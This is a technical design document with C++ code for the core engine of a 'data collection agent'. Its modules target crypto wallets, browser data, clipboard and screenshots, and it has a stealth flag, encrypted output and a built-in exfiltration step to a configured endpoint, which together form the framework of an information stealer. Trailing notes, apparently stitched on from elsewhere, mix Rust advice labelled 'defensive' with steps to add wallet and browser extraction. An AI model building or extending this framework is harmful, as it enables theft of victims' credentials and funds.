# Core Engine Architecture

## Document Purpose

This document details the core engine components: Orchestrator, Module Loader, Module Manager, and Scheduler.

---

## The Core Engine

```
┌─────────────────────────────────────────────────────────────┐
│                      CORE ENGINE                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  The core engine is the brain of the data collection agent. │
│  It coordinates all components and manages execution flow.  │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │                   ORCHESTRATOR                        │ │
│  │  (Coordinates all components, manages lifecycle)      │ │
│  └───────────────────────────────────────────────────────┘ │
│           │                    │                    │       │
│           ▼                    ▼                    ▼       │
│  ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐│
│  │ MODULE LOADER   │ │ MODULE MANAGER  │ │    SCHEDULER    ││
│  │                 │ │                 │ │                 ││
│  │ • Load modules  │ │ • Track state   │ │ • Thread pool   ││
│  │ • Validate      │ │ • Start/Stop    │ │ • Task queue    ││
│  │ • Initialize    │ │ • Health check  │ │ • Priority      ││
│  └─────────────────┘ └─────────────────┘ └─────────────────┘│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 1. Orchestrator

### Responsibility

The Orchestrator is the central coordinator. It:
- Parses configuration
- Initializes all subsystems
- Manages execution lifecycle
- Handles errors and recovery
- Coordinates exfiltration

### Class Structure

```cpp
// orchestrator.h

class Orchestrator {
public:
    Orchestrator(const Config& config);
    ~Orchestrator();
    
    // Lifecycle
    bool initialize();
    bool run();
    void shutdown();
    
    // State
    bool isRunning() const;
    ExecutionStats getStats() const;
    
private:
    // Subsystems
    std::unique_ptr<ModuleLoader> m_loader;
    std::unique_ptr<ModuleManager> m_manager;
    std::unique_ptr<Scheduler> m_scheduler;
    std::unique_ptr<Aggregator> m_aggregator;
    std::unique_ptr<Exfiltration> m_exfil;
    
    // Configuration
    Config m_config;
    
    // State
    bool m_initialized;
    bool m_running;
    ExecutionStats m_stats;
    
    // Internal methods
    bool loadModules();
    bool executeModules();
    bool aggregateResults();
    bool exfiltrateData();
};
```

### Initialization Flow

```cpp
// orchestrator.cpp

bool Orchestrator::initialize() {
    // Step 1: Parse and validate configuration
    if (!m_config.validate()) {
        logError("Invalid configuration");
        return false;
    }
    
    // Step 2: Initialize subsystems
    m_loader = std::make_unique<ModuleLoader>(m_config);
    m_manager = std::make_unique<ModuleManager>();
    m_scheduler = std::make_unique<Scheduler>(m_config.threads);
    m_aggregator = std::make_unique<Aggregator>();
    m_exfil = std::make_unique<Exfiltration>(m_config.exfil);
    
    // Step 3: Load modules
    if (!loadModules()) {
        return false;
    }
    
    // Step 4: Register modules with manager
    for (auto& module : m_loader->getModules()) {
        m_manager->registerModule(module);
    }
    
    m_initialized = true;
    return true;
}
```

### Execution Flow

```cpp
bool Orchestrator::run() {
    if (!m_initialized) {
        return false;
    }
    
    m_running = true;
    auto startTime = std::chrono::steady_clock::now();
    
    // Execute all modules
    bool success = executeModules();
    
    // Aggregate results
    if (success) {
        success = aggregateResults();
    }
    
    // Exfiltrate data
    if (success && !m_config.exfil.endpoint.empty()) {
        success = exfiltrateData();
    }
    
    // Update stats
    auto endTime = std::chrono::steady_clock::now();
    m_stats.totalTime = std::chrono::duration_cast<std::chrono::milliseconds>(
        endTime - startTime
    ).count();
    
    m_running = false;
    return success;
}
```

### Module Execution Logic

```cpp
bool Orchestrator::executeModules() {
    std::vector<ModuleTask> tasks;
    
    // Build task list based on configuration
    for (const auto& moduleName : m_config.modules.enabled) {
        auto module = m_manager->getModule(moduleName);
        if (!module) {
            logWarning("Module not found: " + moduleName);
            continue;
        }
        
        // Create task for scheduler
        ModuleTask task;
        task.module = module;
        task.priority = module->getPriority();
        task.timeout = m_config.timeout;
        
        tasks.push_back(task);
    }
    
    // Execute based on mode
    switch (m_config.mode) {
        case ExecutionMode::Sync:
            return executeSync(tasks);
        case ExecutionMode::Parallel:
            return executeParallel(tasks);
        case ExecutionMode::Hybrid:
            return executeHybrid(tasks);
    }
    
    return false;
}
```

---

## 2. Module Loader

### Responsibility

The Module Loader dynamically loads and validates modules:
- Loads modules from disk or embedded resources
- Validates module signatures (optional)
- Initializes module instances
- Manages module dependencies

### Class Structure

```cpp
// module_loader.h

class ModuleLoader {
public:
    ModuleLoader(const Config& config);
    ~ModuleLoader();
    
    // Load modules
    bool loadFromDirectory(const std::string& path);
    bool loadFromResource(const std::vector<uint8_t>& data);
    bool loadModule(const std::string& name);
    
    // Get loaded modules
    std::vector<std::shared_ptr<IModule>> getModules() const;
    std::shared_ptr<IModule> getModule(const std::string& name) const;
    
    // Validation
    bool validateModule(const ModuleInfo& info);
    bool verifySignature(const std::string& path);
    
private:
    Config m_config;
    std::map<std::string, std::shared_ptr<IModule>> m_modules;
    
    // Platform-specific loading
#ifdef _WIN32
    HMODULE loadLibrary(const std::string& path);
#else
    void* loadLibrary(const std::string& path);
#endif
    
    // Module factory
    std::shared_ptr<IModule> createModule(const std::string& type);
};
```

### Dynamic Loading (Windows)

```cpp
// module_loader_win.cpp

HMODULE ModuleLoader::loadLibrary(const std::string& path) {
    // Load DLL
    HMODULE hModule = LoadLibraryA(path.c_str());
    if (!hModule) {
        logError("Failed to load module: " + path);
        return nullptr;
    }
    
    // Get module factory function
    auto createModuleFn = reinterpret_cast<CreateModuleFn>(
        GetProcAddress(hModule, "CreateModule")
    );
    
    if (!createModuleFn) {
        logError("Module missing CreateModule export");
        FreeLibrary(hModule);
        return nullptr;
    }
    
    // Create module instance
    auto module = createModuleFn();
    if (!module) {
        logError("CreateModule returned null");
        FreeLibrary(hModule);
        return nullptr;
    }
    
    return hModule;
}
```

### Module Factory Pattern

```cpp
// module_factory.cpp

std::shared_ptr<IModule> ModuleLoader::createModule(const std::string& type) {
    if (type == "wallet") {
        return std::make_shared<WalletModule>();
    }
    else if (type == "browser") {
        return std::make_shared<BrowserModule>();
    }
    else if (type == "system") {
        return std::make_shared<SystemModule>();
    }
    else if (type == "clipboard") {
        return std::make_shared<ClipboardModule>();
    }
    else if (type == "screenshot") {
        return std::make_shared<ScreenshotModule>();
    }
    else if (type == "network") {
        return std::make_shared<NetworkModule>();
    }
    
    logError("Unknown module type: " + type);
    return nullptr;
}
```

### Module Validation

```cpp
bool ModuleLoader::validateModule(const ModuleInfo& info) {
    // Check required fields
    if (info.name.empty()) {
        logError("Module name is required");
        return false;
    }
    
    if (info.version.empty()) {
        logError("Module version is required");
        return false;
    }
    
    // Check API compatibility
    if (info.apiVersion != API_VERSION) {
        logError("API version mismatch: " + info.name);
        return false;
    }
    
    // Check dependencies
    for (const auto& dep : info.dependencies) {
        if (!getModule(dep)) {
            logError("Missing dependency: " + dep);
            return false;
        }
    }
    
    // Optional: Verify signature
    if (m_config.requireSignedModules) {
        if (!verifySignature(info.path)) {
            logError("Module signature invalid: " + info.name);
            return false;
        }
    }
    
    return true;
}
```

---

## 3. Module Manager

### Responsibility

The Module Manager tracks module state and lifecycle:
- Registers/unregisters modules
- Tracks execution state
- Manages module health
- Handles module errors

### Module State Machine

```
┌─────────────────────────────────────────────────────────────┐
│                    MODULE STATE MACHINE                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│         ┌─────────┐                                         │
│         │ REGISTER│                                         │
│         └────┬────┘                                         │
│              │                                                │
│              ▼                                                │
│         ┌─────────┐                                          │
│         │  READY  │◄────────────────┐                        │
│         └────┬────┘                 │                        │
│              │                      │                        │
│              │ start()              │                        │
│              ▼                      │                        │
│         ┌─────────┐     error       │                        │
│         │ RUNNING │─────────────────┘                        │
│         └────┬────┘                                          │
│              │                                                │
│              │ complete() / timeout()                        │
│              ▼                                                │
│         ┌─────────┐                                          │
│         │  DONE   │                                          │
│         └────┬────┘                                          │
│              │                                                │
│              │ reset()                                        │
│              ▼                                                │
│         ┌─────────┐                                          │
│         │  READY  │                                          │
│         └─────────┘                                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Class Structure

```cpp
// module_manager.h

enum class ModuleState {
    Unregistered,
    Ready,
    Running,
    Completed,
    Failed,
    Timeout
};

struct ModuleStatus {
    std::string name;
    ModuleState state;
    uint64_t startTime;
    uint64_t endTime;
    std::string error;
    size_t dataSize;
};

class ModuleManager {
public:
    // Registration
    void registerModule(std::shared_ptr<IModule> module);
    void unregisterModule(const std::string& name);
    
    // State management
    bool startModule(const std::string& name);
    bool stopModule(const std::string& name);
    bool resetModule(const std::string& name);
    
    // Queries
    std::shared_ptr<IModule> getModule(const std::string& name);
    ModuleStatus getStatus(const std::string& name) const;
    std::vector<ModuleStatus> getAllStatuses() const;
    
    // Health
    bool isHealthy(const std::string& name) const;
    std::vector<std::string> getHealthyModules() const;
    
private:
    std::map<std::string, std::shared_ptr<IModule>> m_modules;
    std::map<std::string, ModuleStatus> m_statuses;
    
    void updateState(const std::string& name, ModuleState state);
    void recordError(const std::string& name, const std::string& error);
};
```

### Implementation

```cpp
// module_manager.cpp

void ModuleManager::registerModule(std::shared_ptr<IModule> module) {
    if (!module) {
        throw std::invalid_argument("Module cannot be null");
    }
    
    const auto& name = module->getName();
    
    if (m_modules.count(name)) {
        logWarning("Module already registered: " + name);
        return;
    }
    
    // Initialize module
    if (!module->initialize()) {
        logError("Module initialization failed: " + name);
        return;
    }
    
    // Register
    m_modules[name] = module;
    
    // Set initial status
    ModuleStatus status;
    status.name = name;
    status.state = ModuleState::Ready;
    status.dataSize = 0;
    m_statuses[name] = status;
    
    logInfo("Module registered: " + name);
}

bool ModuleManager::startModule(const std::string& name) {
    auto it = m_modules.find(name);
    if (it == m_modules.end()) {
        logError("Module not found: " + name);
        return false;
    }
    
    auto module = it->second;
    auto& status = m_statuses[name];
    
    // Check current state
    if (status.state != ModuleState::Ready) {
        logWarning("Module not ready: " + name);
        return false;
    }
    
    // Update state
    updateState(name, ModuleState::Running);
    status.startTime = getCurrentTimeMs();
    
    // Execute module
    try {
        bool success = module->execute();
        
        if (success) {
            updateState(name, ModuleState::Completed);
            status.dataSize = module->getDataSize();
        } else {
            updateState(name, ModuleState::Failed);
        }
        
        status.endTime = getCurrentTimeMs();
        return success;
        
    } catch (const std::exception& e) {
        recordError(name, e.what());
        updateState(name, ModuleState::Failed);
        status.endTime = getCurrentTimeMs();
        return false;
    }
}

void ModuleManager::updateState(const std::string& name, ModuleState state) {
    m_statuses[name].state = state;
    
    logDebug("Module state changed: " + name + " -> " + stateToString(state));
}

void ModuleManager::recordError(const std::string& name, const std::string& error) {
    m_statuses[name].error = error;
    logError("Module error [" + name + "]: " + error);
}
```

---

## 4. Scheduler

### Responsibility

The Scheduler manages task execution:
- Thread pool management
- Task queuing and prioritization
- Concurrent execution control
- Timeout handling

### Thread Pool Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      THREAD POOL                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                  TASK QUEUE                          │   │
│  │  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐  │   │
│  │  │Task 1│→ │Task 2│→ │Task 3│→ │Task 4│→ │Task 5│  │   │
│  │  └──────┘  └──────┘  ┌──────┐  ┌──────┐            │   │
│  │                      │Task 6│  │Task 7│            │   │
│  │                      └──────┘  └──────┘            │   │
│  └─────────────────────────────────────────────────────┘   │
│           │              │              │                   │
│           ▼              ▼              ▼                   │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐           │
│  │  Thread 1   │ │  Thread 2   │ │  Thread N   │           │
│  │  (Worker)   │ │  (Worker)   │ │  (Worker)   │           │
│  └─────────────┘ └─────────────┘ └─────────────┘           │
│                                                             │
│  Worker threads pull tasks from queue and execute          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Class Structure

```cpp
// scheduler.h

struct Task {
    std::function<bool()> executable;
    std::string name;
    int priority;
    std::chrono::milliseconds timeout;
    std::promise<bool> promise;
};

class Scheduler {
public:
    Scheduler(size_t threadCount);
    ~Scheduler();
    
    // Submit tasks
    std::future<bool> submit(std::function<bool()> task, 
                             const std::string& name,
                             int priority = 0,
                             std::chrono::milliseconds timeout = 30s);
    
    // Submit multiple tasks (batch)
    std::vector<std::future<bool>> submitBatch(
        const std::vector<std::function<bool()>>& tasks);
    
    // Control
    void shutdown();
    void waitForAll();
    
    // Stats
    size_t getQueueSize() const;
    size_t getActiveThreads() const;
    SchedulerStats getStats() const;
    
private:
    std::vector<std::thread> m_workers;
    std::priority_queue<Task, std::vector<Task>, TaskComparator> m_queue;
    
    mutable std::mutex m_mutex;
    std::condition_variable m_condition;
    
    bool m_shutdown;
    size_t m_activeThreads;
    SchedulerStats m_stats;
    
    // Worker loop
    void workerThread();
    bool executeTask(Task& task);
};
```

### Implementation

```cpp
// scheduler.cpp

Scheduler::Scheduler(size_t threadCount) 
    : m_shutdown(false), m_activeThreads(0) {
    
    // Create worker threads
    for (size_t i = 0; i < threadCount; ++i) {
        m_workers.emplace_back(&Scheduler::workerThread, this);
    }
}

Scheduler::~Scheduler() {
    shutdown();
}

std::future<bool> Scheduler::submit(
    std::function<bool()> task,
    const std::string& name,
    int priority,
    std::chrono::milliseconds timeout) {
    
    Task t;
    t.executable = task;
    t.name = name;
    t.priority = priority;
    t.timeout = timeout;
    
    auto future = t.promise.get_future();
    
    {
        std::lock_guard<std::mutex> lock(m_mutex);
        m_queue.push(std::move(t));
        m_condition.notify_one();
    }
    
    return future;
}

void Scheduler::workerThread() {
    while (true) {
        Task task;
        
        // Wait for task
        {
            std::unique_lock<std::mutex> lock(m_mutex);
            m_condition.wait(lock, [this] {
                return m_shutdown || !m_queue.empty();
            });
            
            if (m_shutdown && m_queue.empty()) {
                return;
            }
            
            task = std::move(const_cast<Task&>(m_queue.top()));
            m_queue.pop();
            m_activeThreads++;
        }
        
        // Execute task
        bool success = executeTask(task);
        
        // Set result
        task.promise.set_value(success);
        
        m_activeThreads--;
    }
}

bool Scheduler::executeTask(Task& task) {
    auto startTime = std::chrono::steady_clock::now();
    
    try {
        // Execute with timeout
        auto future = std::async(std::launch::async, task.executable);
        
        if (future.wait_for(task.timeout) == std::future_status::timeout) {
            logWarning("Task timeout: " + task.name);
            m_stats.timeouts++;
            return false;
        }
        
        bool result = future.get();
        
        auto endTime = std::chrono::steady_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(
            endTime - startTime
        ).count();
        
        m_stats.tasksCompleted++;
        m_stats.totalExecutionTime += duration;
        
        return result;
        
    } catch (const std::exception& e) {
        logError("Task failed [" + task.name + "]: " + e.what());
        m_stats.tasksFailed++;
        return false;
    }
}

void Scheduler::shutdown() {
    {
        std::lock_guard<std::mutex> lock(m_mutex);
        m_shutdown = true;
        m_condition.notify_all();
    }
    
    for (auto& worker : m_workers) {
        if (worker.joinable()) {
            worker.join();
        }
    }
}
```

---

## 5. Configuration System

### Configuration Parser

```cpp
// config.h

struct Config {
    // System
    ExecutionMode mode;
    size_t threads;
    uint32_t timeout;
    bool stealth;
    
    // Modules
    struct {
        std::vector<std::string> enabled;
        bool includeLocked;
    } modules;
    
    // Output
    struct {
        std::string format;
        bool compress;
        bool encrypt;
        std::string encryptionKey;
    } output;
    
    // Exfiltration
    struct {
        std::string method;
        std::string endpoint;
        int retryCount;
        int timeout;
    } exfil;
    
    // Validation
    bool validate() const;
};

class ConfigParser {
public:
    static Config parse(const std::string& path);
    static Config parseYaml(const std::string& yaml);
    static Config parseJson(const std::string& json);
    
private:
    static Config loadFromFile(const std::string& path);
    static void validateConfig(Config& config);
};
```

### YAML Parsing Example

```cpp
// config_parser.cpp

Config ConfigParser::parseYaml(const std::string& yaml) {
    Config config;
    
    // Using a YAML library (e.g., yaml-cpp)
    YAML::Node root = YAML::Load(yaml);
    
    // System settings
    if (root["system"]) {
        auto sys = root["system"];
        config.mode = toExecutionMode(sys["mode"].as<std::string>("parallel"));
        config.threads = sys["threads"].as<size_t>(8);
        config.timeout = sys["timeout"].as<uint32_t>(300);
        config.stealth = sys["stealth"].as<bool>(true);
    }
    
    // Module settings
    if (root["modules"]) {
        auto mod = root["modules"];
        config.modules.enabled = mod["enabled"].as<std::vector<std::string>>();
        config.modules.includeLocked = mod["include_locked"].as<bool>(false);
    }
    
    // Output settings
    if (root["output"]) {
        auto out = root["output"];
        config.output.format = out["format"].as<std::string>("json");
        config.output.compress = out["compress"].as<bool>(true);
        config.output.encrypt = out["encrypt"].as<bool>(true);
        config.output.encryptionKey = out["encryption_key"].as<std::string>("");
    }
    
    // Exfiltration settings
    if (root["exfiltration"]) {
        auto exfil = root["exfiltration"];
        config.exfil.method = exfil["method"].as<std::string>("https");
        config.exfil.endpoint = exfil["endpoint"].as<std::string>("");
        config.exfil.retryCount = exfil["retry_count"].as<int>(3);
        config.exfil.timeout = exfil["timeout"].as<int>(30);
    }
    
    validateConfig(config);
    return config;
}
```

---

## 6. Logging System

### Logger Implementation

```cpp
// logger.h

enum class LogLevel {
    Debug,
    Info,
    Warning,
    Error,
    Fatal
};

class Logger {
public:
    static Logger& instance();
    
    void setLevel(LogLevel level);
    void setOutput(const std::string& path);
    
    void log(LogLevel level, const std::string& message);
    
    #define LOG_DEBUG(msg) log(LogLevel::Debug, msg)
    #define LOG_INFO(msg) log(LogLevel::Info, msg)
    #define LOG_WARNING(msg) log(LogLevel::Warning, msg)
    #define LOG_ERROR(msg) log(LogLevel::Error, msg)
    #define LOG_FATAL(msg) log(LogLevel::Fatal, msg)
    
private:
    Logger();
    ~Logger();
    
    std::mutex m_mutex;
    std::ofstream m_file;
    LogLevel m_level;
    
    std::string formatMessage(LogLevel level, const std::string& message);
};

// Usage
LOG_INFO("Orchestrator initialized");
LOG_WARNING("Module timeout: wallet");
LOG_ERROR("Failed to load module: browser");
```

---

## Component Interaction

```
┌─────────────────────────────────────────────────────────────┐
│                  COMPONENT INTERACTION                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  main()                                                     │
│    │                                                        │
│    ▼                                                        │
│  Orchestrator::initialize()                                 │
│    │                                                        │
│    ├─→ ModuleLoader::loadFromDirectory()                   │
│    │     └─→ createModule()                                │
│    │          └─→ Module::initialize()                     │
│    │                                                        │
│    ├─→ ModuleManager::registerModule()                     │
│    │     └─→ ModuleStatus::Ready                           │
│    │                                                        │
│    └─→ Scheduler::Scheduler(threads)                       │
│          └─→ Spawn worker threads                          │
│                                                             │
│  Orchestrator::run()                                        │
│    │                                                        │
│    ├─→ executeModules()                                     │
│    │     └─→ Scheduler::submit() for each module           │
│    │          └─→ Worker threads execute                   │
│    │               └─→ Module::execute()                   │
│    │                    └─→ ModuleManager::updateState()   │
│    │                                                        │
│    ├─→ aggregateResults()                                   │
│    │     └─→ Aggregator::collect()                         │
│    │                                                        │
│    └─→ exfiltrateData()                                     │
│          └─→ Exfiltration::send()                          │
│                                                             │
│  Orchestrator::shutdown()                                   │
│    │                                                        │
│    ├─→ Scheduler::shutdown()                               │
│    │     └─→ Join worker threads                           │
│    │                                                        │
│    └─→ ModuleManager::unregisterAll()                      │
│          └─→ Module::cleanup()                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

**Document:** 02/06  
**Version:** 1.0  
**Classification:** Technical Architecture



 For language choice by major feature (defensive tooling context):

  1. Module interface/plugin system: Rust
  2. Scheduler/concurrency/threading: Rust
  3. Parsing/formatting/compression/encryption: Rust
  4. Cross-platform file/system collection: Rust
  5. Very low-level OS-native internals/legacy WinAPI-heavy parts: C++
  6. Existing large C++ codebase integration: C++ (or Rust + FFI bridge)

  Default pick today: Rust-first, C++ only where ecosystem/interop forces it.

  3. processing (normalize/dedupe/compress/encrypt)
  4. storage (local DB/archive)
  5. transport (optional upload to your own server)
  6. cli/ui (controls + logs)




    Recommended Next Steps

     1. Add data extraction modules (wallet, browser, system)
     2. Replace XOR with AES (add aes-gcm or ring crate)
     3. Add GZIP compression (add flate2 crate)
     4. Add HTTPS support (add rustls or native-tls)
     5. Integrate Scheduler with Orchestrator (parallel task execution)
     6. Add logging (add tracing or log crate)
     7. Implement module timeouts (use std::thread::park_timeout or channels)
     8. Add retry logic to Transport